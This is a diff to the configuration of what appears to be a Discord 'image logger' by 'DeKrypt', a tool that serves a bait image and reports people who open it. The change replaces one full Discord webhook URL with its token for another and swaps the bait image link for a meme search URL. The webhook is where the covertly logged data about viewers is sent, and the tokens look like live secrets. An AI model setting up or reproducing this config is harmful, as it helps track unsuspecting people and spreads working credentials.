@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1558896007721263174/QRdy0dYcKYqLqhfrpXZ_HXMWRmXjbnIT0zIzcsnNeiQYw2LL2YnHpS3Yij01AsepbnXn",
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=ooMogROA&id=3206CAFAC6B077C5C9883B5379F70FF4C3C4E42D&thid=OIP.ooMogROA5Tb0SrfwnmAhAAHaEK&mediaurl=https%3a%2f%2fimages-wixmp-ed30a86b8c4ca887773594c2.wixmp.com%2ff%2f243c6e16-ace7-4101-af38-a8aa88d389bb%2fdfydir4-333f4823-2363-4c26-b736-d7194438200a.png%2fv1%2ffill%2fw_1192%2ch_670%2fsurprised_black_guy_meme_by_weegeedoll_dfydir4-pre.png%3ftoken%3deyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzIwIiwicGF0aCI6IlwvZlwvMjQzYzZlMTYtYWNlNy00MTAxLWFmMzgtYThhYTg4ZDM4OWJiXC9kZnlkaXI0LTMzM2Y0ODIzLTIzNjMtNGMyNi1iNzM2LWQ3MTk0NDM4MjAwYS5wbmciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.WJoC8y8e0uPFQ9R5JNShCfXm80-0EC_OG-zaikNBccg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.a28328811380e536f44ab7f09e602100%3frik%3dLeTEw%252fQP93lTOw%26pid%3dImgRaw%26r%3d0&exph=670&expw=1192&q=meme+pne&FORM=IRPRST&ck=8991146CB1D92980341AA36315614AD6&selectedIndex=4&itb=1&ajaxhist=0&ajaxserp=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
